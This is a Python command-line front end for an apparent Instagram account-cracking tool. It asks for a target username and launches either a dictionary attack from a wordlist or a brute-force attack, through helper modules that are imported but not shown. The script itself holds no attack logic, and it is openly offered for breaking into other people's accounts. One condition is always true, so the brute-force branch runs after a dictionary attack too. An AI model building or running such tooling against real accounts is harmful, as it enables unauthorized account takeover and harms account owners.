import typer
from typing import Optional
import os
import sys
import inquirer

###################
from parts import *
from helper.dict_attack import insta_dict
from helper.bruteforce import insta_brute

#############################


def main(status: Optional[str] = typer.Argument("home")):
    if status == "home":
      home_page()
      mode = [
        inquirer.List(
          "mode",
          message="Choose attack type:",
          choices=[
            typer.style("Dictionary attack",fg=typer.colors.GREEN),
            typer.style("Brute force attack",fg=typer.colors.GREEN),
          ]
        ),
      ]
      y = inquirer.prompt(mode)
      if "Dictionary attack" in y["mode"]:
        wl = typer.prompt(f"{typer.style('Type the name of the dictionary file in the Wordlist folder',fg=typer.colors.GREEN)}")
        user = typer.prompt(f"{typer.style('Enter the target username',fg=typer.colors.GREEN)}")
        insta_dict(wordlist=wl,username=user)
      if "" in y["mode"]:
        username=typer.prompt(f"{typer.style('Enter the target username',fg=typer.colors.GREEN)}")
        pwd_size=int(typer.prompt(f"{typer.style('Enter a passowrd size 8=<',fg=typer.colors.GREEN)}"))
        if pwd_size >=8:
          insta_brute(target=username,pwd_size=pwd_size)
        else:
          typer.secho("Error!",fg=typer.colors.RED)
          quit()

if __name__ == "__main__":
  typer.run(main)
